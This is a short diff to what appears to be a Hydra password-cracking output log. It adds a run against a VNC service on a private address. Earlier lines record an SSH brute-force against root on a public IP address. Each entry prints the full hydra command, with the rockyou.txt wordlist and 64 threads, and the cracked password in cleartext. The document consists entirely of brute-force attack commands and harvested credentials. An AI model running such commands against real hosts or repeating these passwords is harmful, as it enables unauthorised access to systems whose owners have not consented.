@@ -16,3 +16,5 @@
 # Hydra v9.4 run at 2023-04-08 21:17:09 on 194.195.215.174 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.txt -I ssh://194.195.215.174)
 [22][ssh] host: 194.195.215.174   login: root   password: Cmonster2006!@#!@#!@#
 [22][ssh] host: 194.195.215.174   login: root   password: Cmonster2006!@#!@#!@#
+# Hydra v9.4 run at 2023-04-09 21:37:13 on 192.168.1.80 vnc (hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://192.168.1.80)
+[5900][vnc] host: 192.168.1.80   password: Mm2021M1
